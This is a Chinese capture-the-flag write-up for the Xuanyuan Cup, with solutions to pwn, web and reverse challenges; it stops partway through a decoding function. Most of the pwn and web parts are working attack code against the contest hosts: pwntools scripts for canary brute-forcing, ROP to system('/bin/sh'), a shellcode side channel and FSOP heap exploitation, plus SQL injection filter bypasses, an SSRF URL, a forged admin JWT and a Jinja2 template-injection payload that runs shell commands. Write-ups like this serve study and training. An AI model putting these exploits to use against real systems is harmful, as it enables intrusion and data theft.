Pwn
it_is_a_canary
覆盖\x00将canary泄露出来，然后partial write爆破backdoor
from pwn import *
context(arch='amd64',log_level='debug')
file = './pwn'
io = process(file)
elf = ELF(file)
libc = elf.libc

# gdb.attach(io,'b *$rebase(0x12C5)')
s       = lambda data               :io.send(data)
sa      = lambda text,data          :io.sendafter(text, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda text,data          :io.sendlineafter(text, data)
r       = lambda num=4096           :io.recv(num)
rl      = lambda                    :io.recvline()
ru      = lambda text               :io.recvuntil(text)
uu32    = lambda                    :u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
uu64    = lambda                    :u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
inf     =  lambda s                 :info(f"{s} ==> 0x{eval(s):x}")


while 1:
    try:
        io = process('./pwn')
        io = remote('27.25.151.26',61035)
        sa(b'nary?\n',b'a'*0x19)
        ru(b'a'*0x19)
        canary = u64(r(7).rjust(8,b'\x00'))
        inf('canary')
        stack = u64(r(6).ljust(8,b'\x00'))
        inf('stack')
        pay = b'a'*0x18+p64(canary)+p64(0)+p16(0x1253)
        s(pay)
        # gdb.attach(io)

        io.interactive()
    except KeyboardInterrupt:
        io.close()
        exit(0)
    except EOFError:
        io.close()
        continue
Libc
用rop泄露地址然后栈迁移一下就行
from pwn import *
context(arch='amd64',log_level='debug')
file = './pwn'
io = process(file)
elf = ELF(file)
libc = ELF('./libc.so.6')
# libc = elf.libc
io = remote('27.25.151.26',10581)
# gdb.attach(io)
s       = lambda data               :io.send(data)
sa      = lambda text,data          :io.sendafter(text, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda text,data          :io.sendlineafter(text, data)
r       = lambda num=4096           :io.recv(num)
rl      = lambda                    :io.recvline()
ru      = lambda text               :io.recvuntil(text)
uu32    = lambda                    :u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
uu64    = lambda                    :u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
inf     =  lambda s                 :info(f"{s} ==> 0x{eval(s):x}")

rdi = 0x000000000040117e
rsi = 0x0000000000401180
rdx = 0x0000000000401182
bss = 0x404f00
ret = 0x000000000040101a

pay = b'a'*0x10+p64(bss+0x10)+p64(rdi)+p64(1)+p64(rsi)+p64(elf.got['read'])+p64(rdx)+p64(8)+p64(elf.plt['write'])+p64(0x401211)

sla(b'win?\n',pay)
read_ = u64(r(8))

inf('read_')
libc.address = read_ - libc.sym['read']
pay = b'a'*0x10+p64(0)+p64(ret)+p64(rdi)+p64(next(libc.search(b'/bin/sh\x00')))+p64(libc.sym['system'])
s(pay)

# gdb.attach(io)

io.interactive()
babyshellcode
测信道，套个板子就行，不知道为啥我这远程爆着爆着就会变卡。
from pwn import *
context(arch='amd64')
file = './pwn'
io = process(file)

elf = ELF(file)
libc = elf.libc
# gdb.attach(io)
s       = lambda data               :io.send(data)
sa      = lambda text,data          :io.sendafter(text, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda text,data          :io.sendlineafter(text, data)
r       = lambda num=4096           :io.recv(num)
rl      = lambda                    :io.recvline()
ru      = lambda text               :io.recvuntil(text)
uu32    = lambda                    :u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
uu64    = lambda                    :u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
inf     =  lambda s                 :info(f"{s} ==> 0x{eval(s):x}")

or_= asm("mov eax,1"+shellcraft.open('flag')+shellcraft.read('rax','rsp',0x30))
# open read
def cmp(i,j): # 测信道爆破
    a = asm('''
            mov dl,byte ptr[rsp+{}]
            cmp dl,{}
            jz $
    '''.format(i,j))
    return a
flag = 'flag{easy_shellc0de_'
for i in range(20,0x30):
    for j in range(36,127):
        try:
            # pause()
            # io = process('./pwn')
            info('flag ==> '+flag)
            io = remote('27.25.151.26',27718)
            # gdb.attach(io,'b *$rebase(0x137f)')
            # pause()
            s(or_+cmp(i,j)) #发送 shellcode
            # pause()
            io.recv(timeout=2)
            io.close()
            flag += chr(j) 
            
            if j == ord('}'): # 最后一个字符的结束判断
                info('flag ==> '+flag)
                pause()
            io.close()
            break
        except KeyboardInterrupt: # 方便调试 
            io.close()
            exit(0)
        except:
            info('index ==> {},当前字符 ==> {}'.format(i,chr(j))) # log信息
            io.clean()
            io.close()


io.interactive()
baby_heap
2.35 有UAF，打apple2即可
from pwn import *
context(arch='amd64',log_level='debug')
file = './pwn'
io = process(file)
io = remote('27.25.151.26',50872)
elf = ELF(file)
libc = elf.libc
# gdb.attach(io)
s       = lambda data               :io.send(data)
sa      = lambda text,data          :io.sendafter(text, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda text,data          :io.sendlineafter(text, data)
r       = lambda num=4096           :io.recv(num)
rl      = lambda                    :io.recvline()
ru      = lambda text               :io.recvuntil(text)
uu32    = lambda                    :u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
uu64    = lambda                    :u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
inf     =  lambda s                 :info(f"{s} ==> 0x{eval(s):x}")

menu = lambda s:sla(b'choice:\n',str(s))

def add(idx,size):
    menu(1)
    sla(b'index:\n',str(idx))
    sla(b'size:\n',str(size))
def free(idx):
    menu(2)
    sla(b'index:\n',str(idx))
def edit(idx,content):
    menu(3)
    sla(b'index:\n',str(idx))
    sa(b'content:\n',content)
def show(idx):
    menu(4)
    sla(b'index:\n',str(idx))


add(0,0x440)
add(1,0x430)
add(2,0x450)
add(3,0x450)
free(2)
show(2)

libc.address = u64(r(6).ljust(8,b'\x00'))-0x21ace0
inf('libc.address')
add(4,0x500)
edit(2,b'a'*0x11)
show(2)
ru(b'a'*0x10)
heap = u64(r(6).ljust(8,b'\x00'))-0x61-0xb20
inf('heap')
pay = p64(libc.address+0x21b0e0)*2+p64(heap+0xb20)+p64(libc.sym['_IO_list_all']-0x20)
edit(2,pay)
free(0)
add(5,0x500)

syscall = 0x0000000000091316+libc.address
rax = 0x0000000000045eb0+libc.address
rdi = 0x000000000002a3e5+libc.address
ret = 0x000000000002db7d+libc.address
gadget1 = 0x000000000012e8c6+libc.address
# mov rdx, rax; call qword ptr [rbx + 0x28];  similar mov rdx,fake_wide_data_vtable
rop_chain = p64(rdi)+p64(next(libc.search(b'/bin/sh\x00')))+p64(rax)+p64(0x3b)+p64(syscall) # write rop_chain in here
rop_ptr =  heap+0x4a0# addr start of rop_chain 
fake_wide_data_ptr =  heap+0x370+8# result of &fake_IO_wfile_jumps+8
fake_wide_data_vtable = fake_wide_data_ptr+0xe8-0x68

fake_io = flat({0x88:heap,0xa0:fake_wide_data_ptr,0x28:libc.sym['setcontext']+61,0x20:0,0xc0:0,0xd8:libc.sym['_IO_wfile_jumps']},filler=b'\x00')

fake_wide_data = flat({0xe0-0x18:fake_wide_data_vtable},filler=b'\x00')

pay = fake_io[0x10:]+fake_wide_data+p64(gadget1)+p64(0)*6+p64(rop_ptr)+p64(ret)+rop_chain

edit(0,pay)

# gdb.attach(io,'direct /home/xixi/桌面/glibc-source/glibc-2.35\nb _IO_wdoallocbuf\nc')
menu(5)




io.interactive()
ez_ptm
走orw就行，和baby_heap没什么区别，都有uaf。
from pwn import *
context(arch='amd64',log_level='debug')
file = './pwn'
io = process(file)
io = remote('27.25.151.26',32022)
elf = ELF(file)
# libc = elf.libc
libc = ELF('./libc.so.6')
# gdb.attach(io)
s       = lambda data               :io.send(data)
sa      = lambda text,data          :io.sendafter(text, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda text,data          :io.sendlineafter(text, data)
r       = lambda num=4096           :io.recv(num)
rl      = lambda                    :io.recvline()
ru      = lambda text               :io.recvuntil(text)
uu32    = lambda                    :u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
uu64    = lambda                    :u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
inf     =  lambda s                 :info(f"{s} ==> 0x{eval(s):x}")

menu = lambda  s :sla(b'Your choice >> ',str(s))
def add(idx,size):
    menu(1)
    sla(b'Index:\n',str(idx))
    sla(b'Size:\n',str(size))
def free(idx):
    menu(2)
    sla(b'Index:\n',str(idx))
def edit(idx,size,content):
    menu(3)
    sla(b'Index:\n',str(idx))
    sla(b'Size:\n',str(size))
    s(content)
def show(idx):
    menu(4)
    sla(b'Index:\n',str(idx))
def uaf(idx):
    menu(0x1314520)
    sla(b'Index:\n',str(idx))
add(0,0x410)
add(1,0x410)
add(2,0x420)
add(3,0x420)
uaf(2)

add(4,0x500)
show(2)
libc.address = u64(r(6).ljust(8,b'\x00'))-0x21b0d0
inf('libc.address')

edit(2,0x10,b'a'*0x10)
show(2)
ru(b'a'*0x10)
heap = u64(r(6).ljust(8,b'\x00'))-0x2190
inf('heap')
edit(2,0x20,p64(libc.address+0x21b0d0)*2+p64(heap+0x2190)+p64(libc.sym['_IO_list_all']-0x20))
free(0)
add(5,0x500)
add(0,0x410)
edit(0,0x10,b'a'*0x10)

syscall = 0x0000000000091316+libc.address
rdx_rbx = 0x00000000000904a9+libc.address
rsi = 0x000000000002be51+libc.address
rax = 0x0000000000045eb0+libc.address
rdi = 0x000000000002a3e5+libc.address
ret = 0x000000000002db7d+libc.address
gadget1 = 0x000000000012e8c6+libc.address
# mov rdx, rax; call qword ptr [rbx + 0x28];  similar mov rdx,fake_wide_data_vtable
rop_chain = p64(rdi)+p64(0xFFFFFFFFFFFFFF9c)+p64(rsi)+p64(heap+0x2408)+p64(rax)+p64(257)+p64(syscall)+p64(rdi)+p64(3)+p64(rsi)+p64(heap)+p64(rdx_rbx)+p64(0x30)+b'flag\x00\x00\x00\x00'+p64(rax)+p64(0)+p64(syscall)+p64(rdi)+p64(1)+p64(rax)+p64(1)+p64(syscall) # write rop_chain in here
rop_ptr =  heap+0x23a0# addr start of rop_chain 
fake_wide_data_ptr =  heap+0x2270# result of &fake_IO_wfile_jumps+8
fake_wide_data_vtable = fake_wide_data_ptr+0xe8-0x68

fake_io = flat({0x88:heap,0xa0:fake_wide_data_ptr,0x28:libc.sym['setcontext']+61,0x20:0,0xc0:0,0xd8:libc.sym['_IO_wfile_jumps']},filler=b'\x00')

fake_wide_data = flat({0xe0:fake_wide_data_vtable},filler=b'\x00')

pay = fake_io[0x10:]+fake_wide_data+p64(gadget1)+p64(0)*6+p64(rop_ptr)+p64(ret)+rop_chain

edit(2,len(pay),pay)

# gdb.attach(io,'direct /home/xixi/桌面/glibc-source/glibc-2.35\nb _IO_wdoallocbuf\nc')
menu(5)

io.interactive()
ez_tank
以为是反弹shell，丢了一血，奇耻大辱！！！有读文件，用重定向代替ls就行
from pwn import *
import base64
context(arch='amd64',log_level='debug')
file = './httpd'
# io = process(file)
io = remote('27.25.151.26',40565)
# io = remote('127.0.0.1',9999)
elf = ELF(file)
libc = elf.libc
# gdb.attach(io)
s       = lambda data               :io.send(data)
sa      = lambda text,data          :io.sendafter(text, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda text,data          :io.sendlineafter(text, data)
r       = lambda num=4096           :io.recv(num)
rl      = lambda                    :io.recvline()
ru      = lambda text               :io.recvuntil(text)
uu32    = lambda                    :u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
uu64    = lambda                    :u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
inf     =  lambda s                 :info(f"{s} ==> 0x{eval(s):x}")


def post():
    head = b'POST '
    path = b'/index.html'

    pay = head+path
    sl(pay)

    sl(b'Content-Length: 54')
    sl(b'Content-Type: application/x-www-form-urlencoded')
    sl(b'1111')

    pay = b'{\"username\":xixi,\"password\":1234,\"msg\":\"L2Jpbi9zaAA=\"}'
    print(len(pay))

    sl(pay)

    sl(b'ls > a')

def get_ls():
    head = b'GET '
    path = b'/../a'
    pay = head + path
    sl(pay)
    sl(b'')

def get_flag():
    head = b'GET '
    path = b'/../FfffflllllaaAAgg'
    pay = head + path
    sl(pay)
    sl(b'')

# post()
# get_ls()
get_flag()

io.interactive()
ez_kk
熙熙太强啦!!!没代码，真的。改一下poweroff就提权root了。
Web
ezjs
找到关键代码
[图片]
[图片]
Ezflask
[图片]
打开之后注入发现jinja2，直接fenjing 

[图片]

ezrce
很简单的rce
<?php 
error_reporting(0); 
highlight_file(__FILE__); 

function waf($a) { 
    $disable_fun = array( 
        "exec", "shell_exec", "system", "passthru", "proc_open", "show_source",  
        "phpinfo", "popen", "dl", "proc_terminate", "touch", "escapeshellcmd",  
        "escapeshellarg", "assert", "substr_replace", "call_user_func_array",  
        "call_user_func", "array_filter", "array_walk", "array_map",  
        "register_shutdown_function", "register_tick_function", "filter_var",  
        "filter_var_array", "uasort", "uksort", "array_reduce", "array_walk",  
        "array_walk_recursive", "pcntl_exec", "fopen", "fwrite",  
        "file_put_contents", "readfile", "file_get_contents", "highlight_file", "eval" 
    ); 
     
    $disable_fun = array_map('strtolower', $disable_fun); 
    $a = strtolower($a); 

    if (in_array($a, $disable_fun)) { 
        echo "宝宝这对嘛,这不对噢"; 
        return false; 
    } 
    return $a; 
} 

$num = $_GET['num']; 
$new = $_POST['new']; 
$star = $_POST['star']; 

if (isset($num) && $num != 1234) { 
    echo "看来第一层对你来说是小case<br>"; 
    if (is_numeric($num) && $num > 1234) { 
        echo "还是有点实力的嘛<br>"; 
        if (isset($new) && isset($star)) { 
            echo "看起来你遇到难关了哈哈<br>"; 
            $b = waf($new);  
            if ($b) {  
                call_user_func($b, $star);  
                echo "恭喜你，又成长了<br>"; 
            }  
        } 
    } 
} 
?> 
展示payload
[图片]

ezsql1.0
-1/**/union/**/selselectect/**/1,2,database()#
[图片]
-1/**/union/**/selselectect/**/1,2,group_concat(table_name)/**/FROM/**/information_schema.tables/**/where/**/table_schema=database()#
[图片]
-1/**/union/**/selselectect/**/1,2,group_concat(column_name)/**/FROM/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='flag'
[图片]
-1/**/union/**/selselectect/**/1,2,group_concat(id,data)/**/FROM/**/flag
[图片]
给假的flag出题人，你真是个人啊，我这里甚至给他的源代码都读出来了
index.php
<?php 
include('connect.php'); 

$input = $_GET['id'] ?? ''; 
$result_html = ''; 

if (strpos($input, ' ') !== false) {
    $result_html = "<p class='error'>大 hacker</p>";
} else if ($input !== '') {
    $filtered_input = preg_replace('/select/i', '', $input);
    $sql = "SELECT id, username, password FROM users WHERE id = $filtered_input";
    $query = @$conn->query($sql);
    
    if ($query && $query->num_rows > 0) {
        $row = $query->fetch_assoc(); // 只取第一行
        $result_html .= "<table>
            <tr>
                <th>ID</th>
                <th>用户名</th>
                <th>密码</th>
            </tr>";
        
        $result_html .= "<tr>
            <td>" . htmlspecialchars($row['id']) . "</td>
            <td>" . htmlspecialchars($row['username']) . "</td>
            <td>" . htmlspecialchars($row['password']) . "</td>
        </tr>";
        
        $result_html .= "</table>";
    } else {
        $result_html .= "<p class='error'>查询失败或无结果。</p>";
    }
}

if ($conn instanceof mysqli && $conn->ping()) {
    $conn->close();
}
?>
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <title>轩辕杯用户查询</title>
    <style>
        body {
            background: #eef1f4;
            font-family: "Segoe UI", sans-serif;
        }
        .container {
            max-width: 600px;
            margin: 80px auto;
            background: #fff;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 6px 15px rgba(0,0,0,0.1);
        }
        h2 {
            text-align: center;
            color: #333;
        }
        form {
            text-align: center;
            margin-top: 20px;
        }
        input[type="text"] {
            width: 80%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 6px;
        }
        button {
            padding: 12px 20px;
            font-size: 16px;
            margin-left: 10px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
        table {
            margin-top: 25px;
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            border-bottom: 1px solid #ddd;
            text-align: center;
        }
        .error {
            color: #dc3545;
            text-align: center;
            font-weight: bold;
            margin-top: 20px;
        }
        code {
            background: #f5f5f5;
            padding: 4px 8px;
            display: inline-block;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>轩辕杯用户查询</h2>
        <form method="get">
            <input type="text" name="id" placeholder="输入用户ID" value="<?php echo htmlspecialchars($input); ?>">
            <button type="submit">查询</button>
        </form>
        <?php echo $result_html; ?>
    </div>
</body>
</html>
connect.php
<?php $servername = "localhost"; $username = "root"; $password = "123456"; $dbname = "ctf"; $conn = new mysqli($servername, $username, $password, $dbname); if ($conn->connect_error) { die("Connection failed: " . $conn->connect_error); } ?>

重新来过
-1/**/union/**/selselectect/**/1,2,group_concat(schema_name)/**/from/**/information_schema.schemata
[图片]
-1/**/union/**/selselectect/**/*/**/from/**/xuanyuanCTF.info#
[图片]
[图片]
ezssrf1.0
http://27.25.151.26:30326/?url=http:@127.0.0.1/flag
[图片]
http://27.25.151.26:30326/?url=http:@127.0.0.1/FFFFF11111AAAAAggggg.php
[图片]
签到
[图片]
Get a=welcome post b=new cookie star=admin
[图片]
[图片]
回车绕过
[图片]
Referer secretcode  post key ctfpass
[图片]
[图片]
[图片]
[图片]
Sort /f*
[图片]
ezweb1
[图片]
很容易猜到密码
123456789 直接登录
进来之后发现两个路由
一个read一个upload
发现可以文件读取，先读源码
  from flask import Flask, render_template, request, redirect, url_for, make_response, jsonify
import os
import re
import jwt


app = Flask(__name__, template_folder='templates')
app.config['TEMPLATES_AUTO_RELOAD'] = True
SECRET_KEY = os.getenv('JWT_KEY')
book_dir = 'books'
users = {'fly233': '123456789'}


def generate_token(username):
    payload = {
        'username': username
    }
    token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
    return token


def decode_token(token):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return payload
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None


@app.route('/')
def index():
    token = request.cookies.get('token')
    if not token:
        return redirect('/login')
    payload = decode_token(token)
    if not payload:
        return redirect('/login')
    username = payload['username']
    books = [f for f in os.listdir(book_dir) if f.endswith('.txt')]
    return render_template('./index.html', username=username, books=books)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        
        return render_template('./login.html')
    elif request.method == 'POST':
        
        username = request.form.get('username')
        password = request.form.get('password')

        
        if username in users and users[username] == password:
            token = generate_token(username)
            response = make_response(jsonify({
                'message': 'success'
            }), 200)
           
            response.set_cookie('token', token, httponly=True, path='/')
            return response
        else:
            
            return {'message': 'Invalid username or password'}


@app.route('/read', methods=['POST'])
def read_book():
    token = request.cookies.get('token')
    if not token:
        return redirect('/login')
    payload = decode_token(token)
    if not payload:
        return redirect('/login')
    book_path = request.form.get('book_path')
    full_path = os.path.join(book_dir, book_path)
    try:
        with open(full_path, 'r', encoding='utf-8') as file:
            content = file.read()
        return render_template('reading.html', content=content)
    except FileNotFoundError:
        return "文件未找到", 404
    except Exception as e:
        return f"发生错误: {str(e)}", 500


@app.route('/upload', methods=['GET', 'POST'])
def upload():
    token = request.cookies.get('token')
    if not token:
        return redirect('/login')
    payload = decode_token(token)
    if not payload:
        return redirect('/login')
    if request.method == 'GET':
        
        return render_template('./upload.html')
    if payload.get('username') != 'admin':
        return """
        <script>
            alert('只有管理员才有添加图书的权限');
            window.location.href = '/';
        </script>
        """
    file = request.files['file']
    if file:
        book_path = request.form.get('book_path')
        file_path = os.path.join(book_path, file.filename)
        if not os.path.exists(book_path):
            return "文件夹不存在", 400
        file.save(file_path)

        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
            pattern = r'[{}<>_%]'

            if re.search(pattern, content):
                os.remove(file_path)
                return """
                <script>
                    alert('SSTI,想的美！');
                    window.location.href = '/';
                </script>
                """
        return redirect(url_for('index'))
    return "未选择文件", 400

发现这有个jwt，读取环境变量，这里有个非预期
[图片]
读取/proc/1/environ 是非预期
[图片]
拿到key是th1s_1s_k3y
伪造admin
[图片]
然后发现可以打templates渲染，渲染reading.html
读取
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>图书阅读</title>
    <style>
        body {
            font-family: '楷体', serif;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

       .page-title {
            font-size: 36px;
            font-weight: bold;
            color: #333;
            margin-bottom: 20px;
        }

       .book-content {
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            max-width: 90%;
            width: 90%;
            line-height: 1.8;
            font-size: 20px;
            text-align: center;
        }
    </style>
</head>

<body>
    
    <div class="book-content">
        {{ content|safe }}
    </div>
</body>

改下他的页面
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>aa</title>
    <style>
        body {
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

       .page-title {
            font-size: 36px;
            font-weight: bold;
            color: #333;
            margin-bottom: 20px;
        }

       .book-content {
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            max-width: 90%;
            width: 90%;
            line-height: 1.8;
            font-size: 20px;
            text-align: center;
        }
    </style>
</head>

<body>
    
    <div class="book-content">
       {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /f*').read()") }}{% endif %}{% endfor %}
    </div>
</body>

</html>
然后上传到/app/templates/即可，尝试发包
一个读取文件，一个文件上传
[图片]
POST /read HTTP/1.1
Host: 27.25.151.26:30587
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://27.25.151.26:30587
Connection: close
Referer: http://27.25.151.26:30587/
Cookie:a=§§; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImZseTIzMyJ9.inCoyLUdTLkcp-ZHLvIyBEa27Glfu-jHBpWdh_DpWrA
Upgrade-Insecure-Requests: 1
Priority: u=0, i

book_path=/app/templates/reading.html
[图片]
POST /upload HTTP/1.1
Host: 27.25.151.26:30587
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----geckoformboundarya31feb668b07494f8f348df5ca40f5fd
Content-Length: 360
Origin: http://27.25.151.26:30587
Connection: close
Referer: http://27.25.151.26:30587/upload
Cookie:a=§§; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.EYrwzSGzfGe_PMnw-Wl4Ymt_QuMtyApHi57DMcZ7e3U
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundarya31feb668b07494f8f348df5ca40f5fd
Content-Disposition: form-data; name="file"; filename="reading.html"
Content-Type: image/png

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>aa</title>
    <style>
        body {
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

       .page-title {
            font-size: 36px;
            font-weight: bold;
            color: #333;
            margin-bottom: 20px;
        }

       .book-content {
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            max-width: 90%;
            width: 90%;
            line-height: 1.8;
            font-size: 20px;
            text-align: center;
        }
    </style>
</head>

<body>
    
    <div class="book-content">
        {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /f*').read()") }}{% endif %}{% endfor %}
    </div>
</body>

</html>

------geckoformboundarya31feb668b07494f8f348df5ca40f5fd
Content-Disposition: form-data; name="book_path"

/app/templates/
------geckoformboundarya31feb668b07494f8f348df5ca40f5fd--
[图片]

Reverse
ezBase
[图片]
hookme
输入相同的字符搞到xor流
Java.perform(function () {
    let MainActivity = Java.use("com.example.hookme.MainActivity");
    
    MainActivity["rc4Encrypt"].implementation = function (input) {
        console.log(`MainActivity.rc4Encrypt is called: input=${input}`);
        let result = this["rc4Encrypt"](input);
        console.log(`MainActivity.rc4Encrypt result=${result}`);
        return result;
    };
    
    MainActivity["hexStringToByteArray"].implementation = function (hex) {
        console.log(`MainActivity.hexStringToByteArray is called: hex=${hex}`);
        let result = this["hexStringToByteArray"](hex);
        console.log(`MainActivity.hexStringToByteArray result=${result}`);
        return result;
    };
    
    // Note: This is a duplicate of the above implementation
    MainActivity["hexStringToByteArray"].implementation = function (hex) {
        console.log(`MainActivity.hexStringToByteArray is called: hex=${hex}`);
        let result = this["hexStringToByteArray"](hex);
        console.log(`MainActivity.hexStringToByteArray result=${result}`);
        return result;
    };
});
[图片]
输入111等数据 再将数据xor1得到xor流
[图片]

你知道Base么
[图片]
#include <stdio.h>
#include <stdint.h>

void encrypt(uint32_t* v, uint32_t* k) {
    uint32_t v0 = v[0], v1 = v[1], sum = 0, i;
    uint32_t delta = 0x9e3779b9;
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];
    
    for (i = 0; i < 32; i++) {
        sum += delta;
        v0 += ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        v1 += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
    }
    v[0] = v0;
    v[1] = v1;
}

void decrypt(uint32_t* v, uint32_t* key) {
    uint32_t v0 = v[0], v1 = v[1], i;
    uint32_t delta = 0x61C88647;
    uint32_t sum = -delta * 32;
    
    for (i = 0; i < 32; i++) {
        v1 -= (key[3] + (v0 >> 5)) ^ (sum + v0) ^ (key[2] + 16 * v0);
        v0 -= (key[1] + (v1 >> 5)) ^ (sum + v1) ^ (*key + 16 * v1);
        sum += 0x61C88647;
    }
    v[0] = v0;
    v[1] = v1;
}

int main() {
    uint32_t key[4];
    key[0] = 0x12345678;
    key[1] = 0x3456789A;
    key[2] = 0x89ABCDEF;
    key[3] = 0x12345678;
    
    uint32_t enc[4];
    enc[0] = 0xA92F3865;
    enc[1] = 0x9E60E953;
    
    decrypt(enc, key);
    
    uint8_t *flag;
    flag = (uint8_t *)enc;
    
    for (int i = 0; i < 16; i++) {
        printf("%x ", flag[i] % 128);
    }
    
    return 0;
}

[图片]
得到 y0uokTea 
[图片]
[图片]
[图片]
import struct
from typing import Optional

# 自定义Base32字母表（与C代码中的a3数组完全一致，注意包含'+'和'/'）
BASE32_ALPHABET = "gVxwoFhPyT/YM0BKcHe4b8GCUZtlnLW2SJO51IErk+q6vzpamdARX9siND3uQfj7"

# 编码函数（修复索引偏移）
def base32_encode(data: bytes, alphabet: str = BASE32_ALPHABET, padding: bool = False) -> str:
    if not data:
        return ""
    
    # 验证字母表合法性
    if len(alphabet) != 64 or len(set(alphabet)) != 64:
        raise ValueError("Invalid Base32 alphabet (must be 64 unique characters)")
    
    encoded = []
    # 每5字节为一组进行处理
    for i in range(0, len(data), 5):
        chunk = data[i:i + 5]
        # 填充字节并记录原始长度
        pad_len = 5 - len(chunk)
        if pad_len > 0:
            chunk += b'\x00' * pad_len
        
        # 将5字节合并为40位整数（大端序）
        num = int.from_bytes(chunk, byteorder='big')
        # 提取8个5位段（从高位到低位），索引从1开始（对应C代码的+1）
        segments = [(num >> shift) & 0x1F for shift in [35, 30, 25, 20, 15, 10, 5, 0]]
        for seg in segments:
            encoded.append(alphabet[seg + 1])  # 关键修复：索引+1
    
    # 处理填充字符
    if padding:
        # 计算需要添加的'='数量（每5字节对应8字符，不足补=）
        total_chars = len(data) * 8 // 5 + (1 if len(data) % 5 else 0)
        pad_count = (total_chars * 5 - len(data)) % 5
        if pad_count:
            encoded.extend(['='] * (8 - (len(data) % 5) * 8 // 5))
    
    return ''.join(encoded)

# 解码函数（修复索引偏移和大小写敏感问题）
def base32_decode(s: str, alphabet: str = BASE32_ALPHABET, strict: bool = False) -> Optional[bytes]:
    # 移除填充并保留大小写敏感性
    s = s.rstrip('=')
    if not s:
        return b''
    
    # 构建反向映射表（保留大小写敏感）
    dec_table = {char: idx for idx, char in enumerate(alphabet)}
    
    # 严格模式检查
    if strict:
        if len(s) % 8 not in {0, 2, 4, 5, 7}:
            raise ValueError("Invalid encoded length")
        for char in s:
            if char not in dec_table:
                raise ValueError(f"Invalid character: {char}")
    
    # 处理每个8字符块
    decoded = bytearray()
    for i in range(0, len(s), 8):
        chunk = s[i:i + 8]
        # 填充缺失字符（用字母表第0个字符填充，对应C代码的a3[0]）
        if len(chunk) < 8:
            chunk += alphabet[0] * (8 - len(chunk))
        
        # 转换为40位整数（注意索引修正）
        num = 0
        for char in chunk:
            num = (num << 5) | (dec_table[char] - 1)  # 关键修复：索引-1
        
